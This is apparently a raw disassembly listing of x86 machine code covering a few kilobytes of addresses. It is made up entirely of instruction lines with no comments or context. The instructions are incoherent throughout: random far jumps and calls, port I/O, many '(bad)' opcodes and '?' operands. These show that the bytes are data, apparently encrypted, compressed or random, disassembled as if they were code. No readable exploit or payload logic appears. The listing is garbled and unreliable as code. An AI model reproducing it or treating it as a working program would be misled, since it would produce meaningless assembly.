  4207c3:	fucomip st,st(2)
  4207c5:	pop    eax
  4207c6:	in     eax,0xdf
  4207c8:	leave  
  4207c9:	mov    esi,0x8196a2aa
  4207ce:	xchg   ebp,eax
  4207cf:	inc    ebp
  4207d0:	into   
  4207d1:	lds    esp,FWORD PTR [esi+0x4bfbc41f]
  4207d7:	jmp    0x6d95cbab
  4207dc:	mov    ch,0x5e
  4207de:	cs sbb eax,0xdf19db3d
  4207e4:	pop    edi
  4207e5:	and    BYTE PTR [edi-0xb06150],0xfb
  4207ec:	mov    WORD PTR [ebx],cs
  4207ee:	mov    cl,0x43
  4207f0:	out    0x94,eax
  4207f2:	retf   
  4207f3:	mov    ebp,ebx
  4207f5:	add    ecx,DWORD PTR [eax+0x490ea382]
  4207fb:	imul   ebx,DWORD PTR [esi-0x44c31085],0xffffffc1
  420802:	inc    eax
  420803:	pusha  
  420804:	leave  
  420805:	adc    al,0x8c
  420807:	sti    
  420808:	sub    dl,BYTE PTR [ebx-0x19734d6]
  42080e:	xor    DWORD PTR ds:0xbb96506a,esi
  420814:	xor    bl,dl
  420816:	pop    ebx
  420817:	add    BYTE PTR [edi+0x1cb63eab],bl
  42081d:	retf   
  42081e:	adc    ch,ch
  420820:	es jg  0x42086b
  420823:	xchg   esp,eax
  420824:	jns    0x4207e1
  420826:	out    0x75,eax
  420828:	pop    ss
  420829:	enter  0x6383,0x87
  42082d:	dec    edx
  42082e:	lahf   
  42082f:	and    al,BYTE PTR [edi+0x4f]
  420832:	add    edx,DWORD PTR [ebp+0x2dd15b3a]
  420838:	inc    edx
  420839:	mov    ah,0xa3
  42083b:	jmp    0xd567:0x5e263a1f
  420842:	mov    bl,0xdc
  420844:	mov    ds:0xc1bc53b9,al
  420849:	faddp  st(2),st
  42084b:	scas   eax,DWORD PTR es:[edi]
  42084c:	call   esp
  42084e:	mov    dl,0x3b
  420850:	scas   al,BYTE PTR es:[edi]
  420851:	pop    eax
  420852:	jae    0x420856
  420854:	push   ebp
  420855:	(bad)  
  420856:	fldcw  WORD PTR [esi-0x5d]
  420859:	scas   al,BYTE PTR es:[edi]
  42085a:	mov    cl,0x2a
  42085c:	jnp    0x420811
  42085e:	data16 in al,0xbd
  420861:	in     eax,0xeb
  420863:	mov    BYTE PTR [esi-0x2c56f7ea],bl
  420869:	sub    BYTE PTR [ebp+ebp*1-0x62],al
  42086d:	(bad)  
  42086e:	push   ebx
  42086f:	sbb    BYTE PTR [edi+0x2c],ah
  420872:	adc    DWORD PTR [edi+ebp*2-0x67],0xe762acb4
  42087a:	dec    ebx
  42087b:	int3   
  42087c:	leave  
  42087d:	aaa    
  42087e:	iret   
  42087f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420880:	push   ebx
  420881:	push   ss
  420882:	pop    eax
  420883:	pop    edx
  420884:	aam    0xf1
  420886:	jl     0x4208fe
  420888:	sti    
  420889:	daa    
  42088a:	loope  0x4208a3
  42088c:	mov    fs,WORD PTR [ebx+edx*4+0x11]
  420890:	or     eax,0xcb07a127
  420895:	sbb    sp,sp
  420898:	addr16 push esi
  42089a:	jge    0x4208b8
  42089c:	dec    edx
  42089d:	cmc    
  42089e:	dec    esp
  42089f:	sbb    BYTE PTR [ebx-0x4c],bh
  4208a2:	hlt    
  4208a3:	add    eax,0xdebd60b6
  4208a8:	setg   BYTE PTR ds:0xb5497c6c
  4208af:	xchg   ecx,eax
  4208b0:	aaa    
  4208b1:	lods   eax,DWORD PTR ds:[esi]
  4208b2:	pop    ds
  4208b3:	repz xor eax,0xa44c6464
  4208b9:	in     eax,dx
  4208ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4208bb:	mov    ebx,0x6f835562
  4208c0:	add    eax,0xa099222a
  4208c5:	or     DWORD PTR [ebx],ebx
  4208c7:	inc    edx
  4208c8:	sbb    edx,DWORD PTR [esi]
  4208ca:	inc    ebx
  4208cb:	out    dx,eax
  4208cc:	out    0x9d,ax
  4208cf:	pop    ebp
  4208d0:	sbb    esp,DWORD PTR [esi-0x48]
  4208d3:	pop    edi
  4208d4:	push   edi
  4208d5:	in     eax,0xf6
  4208d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4208d8:	mov    dh,0xb6
  4208da:	mov    edx,DWORD PTR [ebp-0x3b102c19]
  4208e0:	jl     0x4208de
  4208e2:	xchg   DWORD PTR [edi],esp
  4208e4:	les    eax,FWORD PTR [edi+0xd4415c1]
  4208ea:	outs   dx,BYTE PTR ds:[esi]
  4208eb:	(bad)  
  4208ec:	out    0xcb,al
  4208ee:	bound  eax,QWORD PTR [eax+ebx*4]
  4208f1:	sub    eax,0xd18621f6
  4208f6:	stos   BYTE PTR es:[edi],al
  4208f7:	imul   ebp,DWORD PTR [ebp-0x55],0x5908a700
  4208fe:	mov    ah,BYTE PTR [ebp+esi*2+0x31]
  420902:	sbb    bl,BYTE PTR [ecx+edi*8+0x31]
  420906:	mov    al,0xa0
  420908:	jmp    0x420956
  42090a:	lods   eax,DWORD PTR ds:[esi]
  42090b:	inc    esp
  42090c:	cwde   
  42090d:	push   ss
  42090e:	ret    
  42090f:	cmp    al,0x24
  420911:	sahf   
  420912:	push   sp
  420914:	into   
  420915:	ins    DWORD PTR es:[edi],dx
  420916:	je     0x4208a4
  420918:	jp     0x4208b6
  42091a:	(bad)  
  42091b:	xor    eax,0x476461c1
  420920:	jge    0x420991
  420922:	repz xchg ebx,eax
  420924:	call   0x9e26:0x24fc7f01
  42092b:	call   DWORD PTR [eax+0x1a42bfc0]
  420931:	pop    edi
  420932:	push   ss
  420933:	and    ch,BYTE PTR [ecx+0x39]
  420936:	retf   
  420937:	lds    edi,FWORD PTR [esi+ebp*2-0x4de52825]
  42093e:	push   ds
  42093f:	fdivr  DWORD PTR [ebx-0x6d]
  420942:	aam    0xf6
  420944:	jg     0x420973
  420946:	mov    es,WORD PTR ds:0xcfbbbb33
  42094c:	mov    cs,ecx
  42094e:	mov    cs,WORD PTR [edi]
  420950:	fbld   TBYTE PTR [ebp+ebp*2+0x53d02482]
  420957:	in     eax,dx
  420958:	shl    edi,1
  42095a:	sar    ecx,1
  42095c:	inc    esp
  42095d:	pop    esi
  42095e:	xchg   BYTE PTR [edx+esi*2],dh
  420961:	fld    QWORD PTR [ecx-0xe84cce]
  420967:	mov    ecx,0xe192f5f4
  42096c:	inc    edx
  42096d:	call   0x4917:0x85d54b20
  420974:	mov    edx,0x72970642
  420979:	lds    ebp,FWORD PTR [edx+0x5a1d6b4d]
  42097f:	adc    ah,ch
  420981:	mov    edi,0x6b44a7a1
  420986:	lods   al,BYTE PTR ds:[esi]
  420987:	dec    edi
  420988:	xchg   BYTE PTR [edi+ecx*8],ch
  42098b:	je     0x4209fa
  42098d:	enter  0xddcd,0xdf
  420991:	mov    eax,ds:0x6df0f11b
  420996:	aam    0x88
  420998:	inc    ecx
  420999:	push   cs
  42099a:	jmp    0x3d76:0x813fddd3
  4209a1:	ret    0xb3d3
  4209a4:	xchg   ebx,esi
  4209a6:	xlat   BYTE PTR ds:[ebx]
  4209a7:	and    ch,BYTE PTR [ebp-0x1b]
  4209aa:	repnz test DWORD PTR [esi],ebp
  4209ad:	(bad)  
  4209ae:	bnd jnp 0x420964
  4209b1:	push   ebp
  4209b2:	cld    
  4209b3:	fiadd  DWORD PTR [edx-0x6c]
  4209b6:	rcr    BYTE PTR [edx],cl
  4209b8:	add    BYTE PTR [eax+edi*2],al
  4209bb:	ror    DWORD PTR [edx-0x3a9ec590],1
  4209c1:	add    edx,edi
  4209c3:	or     esi,DWORD PTR [ebx+0x27]
  4209c6:	out    dx,eax
  4209c7:	fdivr  DWORD PTR [eax+0x75]
  4209ca:	and    ecx,DWORD PTR [esi]
  4209cc:	neg    DWORD PTR [ecx+0x5]
  4209cf:	fucom  st(1)
  4209d1:	lds    edi,FWORD PTR [esi+0x28a5c4c3]
  4209d7:	das    
  4209d8:	xor    eax,0x233e7d33
  4209dd:	jne    0x4209b5
  4209df:	in     eax,dx
  4209e0:	clc    
  4209e1:	(bad)  
  4209e2:	repnz or dl,BYTE PTR [edx+0x512c8ce1]
  4209e9:	dec    esp
  4209ea:	inc    esi
  4209eb:	sbb    al,0x5c
  4209ed:	popa   
  4209ee:	cli    
  4209ef:	inc    esp
  4209f0:	adc    dl,BYTE PTR [esi]
  4209f2:	int    0xd0
  4209f4:	inc    eax
  4209f5:	sub    BYTE PTR [esi+0x3c1f7c9c],ch
  4209fb:	add    al,0x69
  4209fd:	repz adc BYTE PTR ss:[ebx],ah
  420a01:	adc    al,0x11
  420a03:	fld    TBYTE PTR [ecx+0x290e02d9]
  420a09:	dec    ebx
  420a0a:	or     DWORD PTR [ebx+0x2c8f20a9],eax
  420a10:	outs   dx,BYTE PTR ds:[esi]
  420a11:	icebp  
  420a12:	sar    ch,1
  420a14:	mov    al,ds:0x88650853
  420a19:	mov    ds:0xbca5e9d3,al
  420a1e:	mov    al,BYTE PTR [esi-0x4]
  420a21:	fcmovnb st,st(6)
  420a23:	pop    esp
  420a24:	test   BYTE PTR [ebx],bl
  420a26:	rcr    BYTE PTR [edx+0x718ec279],1
  420a2c:	sbb    eax,0xae0ef98c
  420a31:	popa   
  420a32:	adc    eax,0x7593a1d2
  420a38:	fisttp DWORD PTR [ebx+ecx*4]
  420a3b:	mov    BYTE PTR [ebx-0x51],0x7b
  420a3f:	xchg   edx,eax
  420a40:	ins    DWORD PTR es:[edi],dx
  420a41:	das    
  420a42:	push   cs
  420a43:	call   edx
  420a45:	xor    DWORD PTR [ecx],0xe42d4ee5
  420a4b:	xchg   edi,eax
  420a4c:	lods   eax,DWORD PTR ds:[esi]
  420a4d:	mov    al,cs:0x71add44c
  420a53:	jns    0x420a45
  420a55:	mov    ds:0xc91518b9,al
  420a5a:	test   BYTE PTR es:[ecx+0x7c3a31d4],bl
  420a61:	dec    edx
  420a62:	test   BYTE PTR [edi+0x50d4cfb4],al
  420a68:	inc    esp
  420a69:	sub    BYTE PTR [edx+0x7ab5c15f],0x99
  420a70:	push   cs
  420a71:	rcr    BYTE PTR [eax],cl
  420a73:	iret   
  420a74:	push   0x82f2bc86
  420a79:	add    bl,BYTE PTR ds:0x1ecb1318
  420a7f:	mov    bh,0x4b
  420a81:	out    0xb6,eax
  420a83:	adc    edi,eax
  420a85:	loop   0x420a7e
  420a87:	pop    ss
  420a88:	hlt    
  420a89:	xor    eax,0xc1c2de93
  420a8e:	cdq    
  420a8f:	or     eax,0xeaa88f2f
  420a94:	lds    esi,FWORD PTR [eax+0x2b]
  420a97:	mov    dl,0xe6
  420a99:	sbb    DWORD PTR [ecx+0x2d],edx
  420a9c:	mov    al,0x4e
  420a9e:	and    eax,0xd08502e1
  420aa3:	or     eax,0xa3a02cc8
  420aa8:	movq   mm2,QWORD PTR [ecx+0x623c877f]
  420aaf:	jb     0x420a6b
  420ab1:	or     DWORD PTR [edi],0x43
  420ab4:	int    0x23
  420ab6:	and    cl,BYTE PTR [eax]
  420ab8:	mov    ebp,DWORD PTR [edi-0x6e4ea1c0]
  420abe:	inc    edx
  420abf:	sub    al,0x5f
  420ac1:	(bad)  
  420ac2:	dec    esp
  420ac3:	jb     0x420aaf
  420ac5:	idiv   BYTE PTR [edx]
  420ac7:	nop    DWORD PTR [ecx-0x5]
  420acb:	stos   BYTE PTR es:[edi],al
  420acc:	inc    esp
  420acd:	pop    ebp
  420ace:	or     eax,0xc3921725
  420ad3:	(bad)  
  420ad4:	lea    ebx,[eax+0x45]
  420ad7:	(bad)  
  420ad9:	or     eax,0xbf5c7379
  420ade:	cmp    ebx,DWORD PTR [edx+0x62]
  420ae1:	loope  0x420b15
  420ae3:	test   al,0x3c
  420ae5:	xor    DWORD PTR [ecx-0x38],esi
  420ae8:	je     0x420a6e
  420aea:	mov    bh,0x22
  420aec:	out    dx,al
  420aed:	(bad)  
  420aee:	neg    ch
  420af0:	inc    edx
  420af1:	outs   dx,DWORD PTR ds:[esi]
  420af2:	and    ebx,DWORD PTR [eax]
  420af4:	mov    BYTE PTR [eax+0x7],bl
  420af7:	sbb    ecx,DWORD PTR [ecx+0x1664498f]
  420afd:	push   ds
  420afe:	mov    esi,0xb150dc8b
  420b03:	mov    dl,0x52
  420b05:	mov    bl,0x1c
  420b07:	inc    esi
  420b08:	pop    ss
  420b09:	imul   esi,esp,0x7f
  420b0c:	lahf   
  420b0d:	adc    ebx,esi
  420b0f:	sub    al,0x5f
  420b11:	pop    ds
  420b12:	push   edx
  420b13:	mov    edi,0x40f540f1
  420b18:	fst    QWORD PTR [esi+edx*4]
  420b1b:	xor    esi,edi
  420b1d:	jmp    0x420b6b
  420b1f:	loop   0x420af5
  420b21:	mov    eax,0x80ffa29e
  420b26:	mov    eax,0x5e979667
  420b2b:	test   eax,0xefefd618
  420b30:	retf   
  420b31:	adc    eax,0x961f16ef
  420b36:	pop    edi
  420b37:	mov    dl,0x55
  420b39:	shl    BYTE PTR [ebp-0x4c6e9e74],cl
  420b3f:	jmp    0x472e00a6
  420b44:	sub    ebp,esi
  420b46:	pop    ebx
  420b47:	enter  0x424,0xe3
  420b4b:	sbb    eax,0x9ffa6ec0
  420b50:	imul   eax,ecx,0x79966878
  420b56:	ret    
  420b57:	pop    edx
  420b58:	iret   
  420b59:	call   0x3b9eea27
  420b5e:	dec    ebx
  420b5f:	aam    0xce
  420b61:	push   esp
  420b62:	ja     0x420b05
  420b64:	jle    0x420b5f
  420b66:	jne    0x420b4f
  420b68:	pop    edx
  420b69:	mov    eax,0xfde9d1a1
  420b6e:	jo     0x420b18
  420b70:	in     al,0x98
  420b72:	dec    ebp
  420b73:	aam    0x32
  420b75:	aaa    
  420b76:	cmc    
  420b77:	mov    edx,0x7e0c331f
  420b7c:	mov    DWORD PTR [esi-0x3c],ecx
  420b7f:	jno    0x420b67
  420b81:	scas   al,BYTE PTR es:[edi]
  420b82:	lods   al,BYTE PTR ds:[esi]
  420b83:	cld    
  420b84:	loopne 0x420b71
  420b86:	xor    DWORD PTR [ecx+0xd],ebp
  420b89:	ror    ch,cl
  420b8b:	push   esi
  420b8c:	pop    esp
  420b8d:	ret    0xa8ae
  420b90:	sbb    ah,BYTE PTR [ebp+0x30cca3c8]
  420b96:	call   0xab55:0x717f2282
  420b9d:	(bad)  
  420b9e:	call   FWORD PTR [eax+0x0]
  420ba1:	fnstenv [edx+edi*1]
  420ba4:	icebp  
  420ba5:	(bad)  
  420ba6:	xchg   esp,eax
  420ba7:	mov    edx,0xcca300a4
  420bac:	jp     0x420bf6
  420bae:	inc    edi
  420baf:	js     0x420ba2
  420bb1:	adc    eax,edi
  420bb3:	jg     0x420b5c
  420bb5:	loop   0x420b65
  420bb7:	jbe    0x420bc1
  420bb9:	xor    DWORD PTR gs:[ebx-0x3c9297e5],edi
  420bc0:	test   al,0x7b
  420bc2:	xor    eax,0xa8eb5822
  420bc7:	push   0x42
  420bc9:	sbb    BYTE PTR [esp+eiz*2-0x2ba31870],cl
  420bd0:	or     esp,DWORD PTR [edi]
  420bd2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420bd3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420bd4:	test   eax,0x23393d7f
  420bd9:	pusha  
  420bda:	sbb    bl,al
  420bdc:	add    ebx,DWORD PTR [eax+0x65]
  420bdf:	pop    ebx
  420be0:	push   eax
  420be1:	shl    BYTE PTR [esi+0x7d],cl
  420be4:	xor    WORD PTR [eax-0x7da4f50a],di
  420beb:	or     BYTE PTR [edi+0x7d],dh
  420bee:	pop    ebp
  420bef:	in     al,dx
  420bf0:	int3   
  420bf1:	sti    
  420bf2:	and    al,0x55
  420bf4:	pop    ds
  420bf5:	ror    DWORD PTR [ecx+0x12934d26],cl
  420bfb:	push   ecx
  420bfc:	pusha  
  420bfd:	sbb    al,bl
  420bff:	xchg   esi,eax
  420c00:	and    ebp,DWORD PTR [edx+ecx*2]
  420c03:	xchg   edx,eax
  420c04:	add    al,0x2
  420c06:	dec    ebp
  420c07:	ret    0x1d63
  420c0a:	jle    0x420b92
  420c0c:	jns    0x420bb4
  420c0e:	shl    esp,1
  420c10:	into   
  420c11:	adc    eax,0xffffffd1
  420c14:	push   cs
  420c15:	out    0xce,al
  420c17:	xchg   esp,eax
  420c18:	sbb    eax,0xde161716
  420c1d:	dec    esp
  420c1e:	xchg   DWORD PTR [edx],edx
  420c20:	mov    bl,0x1c
  420c22:	cmp    eax,0xd5bd0e3
  420c27:	mov    ds:0xd8e879e8,al
  420c2c:	(bad)  
  420c2d:	pop    ds
  420c2e:	xchg   BYTE PTR [edi+0x8739cb1],cl
  420c34:	push   edx
  420c35:	or     eax,0x5e2832c6
  420c3a:	or     ebp,DWORD PTR [ebp-0x714347fe]
  420c40:	repnz pop ss
  420c42:	fnstcw WORD PTR [edx]
  420c44:	xlat   BYTE PTR ds:[ebx]
  420c45:	sub    eax,0xab9d3374
  420c4a:	sahf   
  420c4b:	inc    edx
  420c4c:	lock cmp BYTE PTR [ebx],0x62
  420c50:	xchg   esi,eax
  420c51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420c52:	sub    eax,0xc8f01d88
  420c57:	shl    cl,cl
  420c59:	push   cs
  420c5a:	jnp    0x420c89
  420c5c:	fisttp QWORD PTR [ebx-0x1e]
  420c5f:	jbe    0x420c36
  420c61:	xchg   ebx,eax
  420c62:	push   ebp
  420c63:	or     BYTE PTR [esi+0x5a],bl
  420c66:	ret    
  420c67:	das    
  420c68:	fiadd  WORD PTR [ebx]
  420c6a:	fbstp  TBYTE PTR [esi]
  420c6c:	jae    0x420c8f
  420c6e:	mul    DWORD PTR [ebx+0x7]
  420c71:	push   0xec3aed69
  420c76:	lds    ebp,FWORD PTR [edx]
  420c78:	push   cs
  420c79:	gs xchg esi,eax
  420c7b:	jae    0x420c04
  420c7d:	in     eax,dx
  420c7e:	mov    edx,esp
  420c80:	ja     0x420cca
  420c82:	sbb    DWORD PTR ds:0xc4308c5,edi
  420c88:	cmp    esi,DWORD PTR [edi]
  420c8a:	push   es
  420c8b:	mov    ebx,0xffcb2fd7
  420c90:	mov    ds:0xa7dc1438,al
  420c95:	mov    edi,0x62704140
  420c9a:	add    al,BYTE PTR [esi-0x2]
  420c9d:	ja     0x420cf0
  420c9f:	cmc    
  420ca0:	pop    ecx
  420ca1:	push   edx
  420ca2:	out    dx,al
  420ca3:	rol    dl,cl
  420ca5:	cs jns 0x420c7f
  420ca8:	pop    eax
  420ca9:	sahf   
  420caa:	xor    DWORD PTR [esi-0x5b],0x60c24a7e
  420cb1:	ins    DWORD PTR es:[edi],dx
  420cb2:	mov    WORD PTR [edi],ss
  420cb4:	fdiv   QWORD PTR [ebp+0x5db4e51c]
  420cba:	imul   DWORD PTR [ebp-0x7f]
  420cbd:	adc    edi,DWORD PTR [esp+esi*2]
  420cc0:	and    edi,ebp
  420cc2:	mov    dl,0xae
  420cc4:	jl     0x420c72
  420cc6:	xor    eax,0x1f3b0a1e
  420ccb:	test   DWORD PTR [esi],ebp
  420ccd:	jno    0x420d39
  420ccf:	fs inc edx
  420cd1:	push   esp
  420cd2:	leave  
  420cd3:	dec    ecx
  420cd4:	fdivr  DWORD PTR [ecx+ebx*2+0x51]
  420cd8:	mov    WORD PTR [edi],?
  420cda:	test   cl,0x7b
  420cdd:	call   0x92a7:0xb28ab381
  420ce4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420ce5:	jle    0x420cf7
  420ce7:	or     BYTE PTR [ebp+0x4cd784ce],0x51
  420cee:	shl    DWORD PTR [ebp+0x270841a0],cl
  420cf4:	mov    ?,esp
  420cf6:	cdq    
  420cf7:	mov    al,ds:0xfc78d59a
  420cfc:	rcl    BYTE PTR [esi],0x62
  420cff:	outs   dx,BYTE PTR ds:[esi]
  420d00:	dec    eax
  420d01:	shl    BYTE PTR [eax-0x5e],1
  420d04:	int    0xf0
  420d06:	sbb    cl,ah
  420d08:	inc    esp
  420d09:	mov    dh,0xae
  420d0b:	aam    0x1
  420d0d:	mov    bl,0x67
  420d0f:	pop    edi
  420d10:	jmp    0x7bb7:0xa29874ee
  420d17:	ret    0xd593
  420d1a:	pop    esi
  420d1b:	test   dl,bl
  420d1d:	xor    ebx,DWORD PTR ss:[edx]
  420d20:	gs inc ebp
  420d22:	fadd   st,st(6)
  420d24:	mov    dh,0xe1
  420d26:	and    ch,BYTE PTR cs:[edi]
  420d29:	mul    DWORD PTR [eax-0x4f]
  420d2c:	loop   0x420cf3
  420d2e:	jns    0x420cbb
  420d30:	push   ebp
  420d31:	mov    eax,0x2349e9
  420d36:	add    BYTE PTR ds:0xe7c03733,ch
  420d3c:	fsub   QWORD PTR [ebp-0x7d]
  420d3f:	(bad)  [esi-0x53]
  420d42:	jle    0x420ccb
  420d44:	inc    edx
  420d45:	xor    esi,ecx
  420d47:	ret    0x61b7
  420d4a:	bound  edx,QWORD PTR [ecx+0x5f]
  420d4d:	bound  esp,QWORD PTR [edx-0xb]
  420d50:	xlat   BYTE PTR ds:[ebx]
  420d51:	cs icebp 
  420d53:	ss push edx
  420d55:	std    
  420d56:	adc    ebp,DWORD PTR [ecx]
  420d58:	test   eax,0x379e54bb
  420d5d:	std    
  420d5e:	or     DWORD PTR [ecx+ecx*2],edi
  420d61:	fisttp DWORD PTR [esp+ebp*4+0x5b61384f]
  420d68:	leave  
  420d69:	jo     0x420da9
  420d6b:	lahf   
  420d6c:	cmp    DWORD PTR [edx+0x653dacaa],esi
  420d72:	jge    0x420d99
  420d74:	dec    esp
  420d75:	mov    ds:0x136d765e,eax
  420d7a:	jno    0x420d3b
  420d7c:	fs adc al,0x6b
  420d7f:	into   
  420d80:	nop
  420d81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420d82:	mov    ebx,0xa339e979
  420d87:	int    0xf
  420d89:	jl     0x420d4a
  420d8b:	test   BYTE PTR [ebp+0x55e4d3d1],bl
  420d91:	cli    
  420d92:	out    dx,eax
  420d93:	jmp    0x6dd6:0x900341fa
  420d9a:	int    0xfa
  420d9c:	sbb    al,0xf2
  420d9e:	ds mov edi,0x837a8128
  420da4:	sbb    esi,ebx
  420da6:	(bad)  
  420da8:	inc    ebx
  420da9:	jp     0x420d51
  420dab:	mov    esi,0x7a733b80
  420db0:	pop    edi
  420db1:	mov    DWORD PTR [edi+0x2b],esi
  420db4:	(bad)  
  420db5:	push   edx
  420db6:	pop    ebp
  420db7:	cdq    
  420db8:	int    0x37
  420dba:	das    
  420dbb:	ja     0x420e2c
  420dbd:	inc    esp
  420dbe:	pushf  
  420dbf:	hlt    
  420dc0:	xor    dh,BYTE PTR [esi-0x56ff35f6]
  420dc6:	out    0x3d,al
  420dc8:	xor    eax,0x5d498e
  420dcd:	add    DWORD PTR [ebp+0x18273e3],0x16
  420dd4:	cdq    
  420dd5:	mov    dh,0xdb
  420dd7:	mov    ebp,DWORD PTR [ebp+0x75]
  420dda:	cmp    eax,0x38cac3ff
  420ddf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420de0:	shl    BYTE PTR [eax-0xc7d7191],1
  420de6:	outs   dx,DWORD PTR ds:[esi]
  420de7:	aam    0x5d
  420de9:	pop    ds
  420dea:	(bad)  
  420deb:	cli    
  420dec:	fisttp WORD PTR [edi-0x1]
  420def:	push   edi
  420df0:	push   0xffffffe0
  420df2:	dec    ebp
  420df3:	mov    ebp,0x4d12f201
  420df8:	cmp    esi,DWORD PTR [edi-0x21]
  420dfb:	mov    edx,0xb632e1c4
  420e00:	fs jbe 0x420e7f
  420e03:	(bad)  
  420e04:	cs xchg esp,eax
  420e06:	nop
  420e07:	dec    ebp
  420e08:	inc    esi
  420e09:	sar    DWORD PTR [ebx+0x50],0x19
  420e0d:	sub    DWORD PTR [esi],ebp
  420e0f:	cmp    dl,BYTE PTR [esi-0x442fca7a]
  420e15:	ss in  eax,dx
  420e17:	int3   
  420e18:	mov    bl,0x9a
  420e1a:	inc    ecx
  420e1b:	pusha  
  420e1c:	sbb    DWORD PTR [ecx-0x6343c6c3],eax
  420e22:	cli    
  420e23:	xchg   ecx,eax
  420e24:	cmp    eax,0xd5eda95
  420e29:	or     al,0xa1
  420e2b:	sbb    al,0xc2
  420e2d:	mov    ecx,0x3d07b9a8
  420e32:	addr16 repz aas 
  420e35:	cmp    eax,0x21766cc9
  420e3a:	pusha  
  420e3b:	idiv   bl
  420e3d:	or     ah,0xa3
  420e40:	cmp    al,0xe4
  420e42:	call   0x66dc:0x9859a7c7
  420e49:	cmc    
  420e4a:	mov    ah,0x18
  420e4c:	inc    ebp
  420e4d:	sub    al,0xbd
  420e4f:	ja     0x420ea0
  420e51:	aaa    
  420e52:	nop
  420e53:	gs loope 0x420e41
  420e56:	mov    cl,0x24
  420e58:	mov    eax,ds:0xf7048746
  420e5d:	mov    BYTE PTR [eax+0x1eae5aff],ah
  420e63:	loop   0x420eb7
  420e65:	cli    
  420e66:	out    0xec,al
  420e68:	push   ebp
  420e69:	das    
  420e6a:	push   edi
  420e6b:	push   eax
  420e6c:	mov    edx,0x337c26ef
  420e71:	dec    ebp
  420e72:	or     DWORD PTR [ebx+0x19c10300],edx
  420e78:	pop    ss
  420e79:	sub    esi,DWORD PTR [eax-0x64a0af8d]
  420e7f:	push   ebp
  420e80:	(bad)  
  420e81:	in     eax,dx
  420e82:	mov    bl,BYTE PTR [esp+edx*1-0x2109f427]
  420e89:	daa    
  420e8a:	xor    ebp,DWORD PTR [ebp+0x20]
  420e8d:	jge    0x420e87
  420e8f:	call   0xd988:0xc03ebdd2
  420e96:	in     al,dx
  420e97:	ja     0x420ea4
  420e99:	cmp    ecx,ebp
  420e9b:	or     bh,dh
  420e9d:	(bad)  
  420e9f:	outs   dx,DWORD PTR ds:[esi]
  420ea0:	add    eax,0x76285bec
  420ea5:	add    dh,BYTE PTR [edi+0x1ac9c5b4]
  420eab:	or     ecx,0x98d87f86
  420eb1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420eb2:	cmp    ecx,ecx
  420eb4:	sbb    eax,0xa1404770
  420eb9:	cli    
  420eba:	inc    ebp
  420ebb:	cwde   
  420ebc:	lock and esi,DWORD PTR [ebx+edi*1]
  420ec0:	mov    cl,BYTE PTR [esi]
  420ec2:	xor    DWORD PTR [ecx-0x14],0x8008f44f
  420ec9:	adc    al,0xf2
  420ecb:	(bad)  
  420ecd:	les    esi,FWORD PTR [ebx-0x107374e4]
  420ed3:	and    eax,edx
  420ed5:	adc    al,0x11
  420ed7:	pop    ebx
  420ed8:	mov    edi,0xb4bd80d6
  420edd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420ede:	dec    ebp
  420edf:	lahf   
  420ee0:	retf   
  420ee1:	cmp    DWORD PTR [ebx],esp
  420ee3:	fadd   st(6),st
  420ee5:	out    dx,eax
  420ee6:	das    
  420ee7:	cmp    BYTE PTR [ecx+0x6a],bh
  420eea:	push   ss
  420eeb:	dec    esp
  420eec:	add    dh,al
  420eee:	jmp    0xf58617e1
  420ef3:	sti    
  420ef4:	cmp    BYTE PTR [esi+0x7c],bl
  420ef7:	mov    cl,BYTE PTR [eax-0x24bcb9de]
  420efd:	xchg   ebp,eax
  420efe:	adc    ecx,esi
  420f00:	push   ecx
  420f01:	shl    dh,cl
  420f03:	add    eax,DWORD PTR [ebx-0x1e]
  420f06:	pop    ebx
  420f07:	xchg   ebp,eax
  420f08:	cdq    
  420f09:	jne    0x420eb9
  420f0b:	outs   dx,BYTE PTR ds:[esi]
  420f0c:	jp     0x420e9a
  420f0e:	pop    eax
  420f0f:	pop    edx
  420f10:	(bad)  
  420f11:	pop    es
  420f12:	rcr    DWORD PTR [esi+0x9],cl
  420f15:	cmp    edx,ebx
  420f17:	xchg   esp,eax
  420f18:	adc    bl,0x97
  420f1b:	aam    0x78
  420f1d:	xchg   esi,eax
  420f1e:	pop    edi
  420f1f:	cmp    eax,0xe5b429ee
  420f24:	retf   
  420f25:	retf   
  420f26:	jns    0x420f48
  420f28:	jp     0x420eed
  420f2a:	retf   
  420f2b:	pushf  
  420f2c:	push   edx
  420f2d:	nop
  420f2e:	jns    0x420f7f
  420f30:	out    0xef,eax
  420f32:	sar    bl,1
  420f34:	xlat   BYTE PTR ds:[ebx]
  420f35:	fcmovnbe st,st(5)
  420f37:	(bad)  
  420f38:	push   cs
  420f39:	pop    ecx
  420f3a:	icebp  
  420f3b:	fnstsw WORD PTR [eax+0x393741a7]
  420f41:	fwait
  420f42:	adc    ah,bh
  420f44:	pop    ebp
  420f45:	aas    
  420f46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420f47:	sti    
  420f48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420f49:	push   eax
  420f4a:	mov    ds:0x3ca2a2d2,eax
  420f4f:	pop    ss
  420f50:	lea    ebp,[esi+0x0]
  420f53:	pusha  
  420f54:	icebp  
  420f55:	mov    WORD PTR [edx-0x9],?
  420f58:	pop    ebp
  420f59:	ret    
  420f5a:	inc    esi
  420f5b:	stos   DWORD PTR es:[edi],eax
  420f5c:	inc    esi
  420f5d:	stc    
  420f5e:	retf   
  420f5f:	mov    dh,0x5f
  420f61:	mov    cl,0xed
  420f63:	nop
  420f64:	mov    fs,edi
  420f66:	cmp    eax,0x94072cc8
  420f6b:	mov    edx,0x67e5688b
  420f70:	xchg   esi,eax
  420f71:	dec    eax
  420f72:	(bad)  
  420f73:	xor    esp,esp
  420f75:	gs push edi
  420f77:	bound  eax,QWORD PTR [eax-0x7f]
  420f7a:	sub    BYTE PTR [esi+0x70],al
  420f7d:	popf   
  420f7e:	mov    ch,0x73
  420f80:	(bad)  
  420f81:	retf   
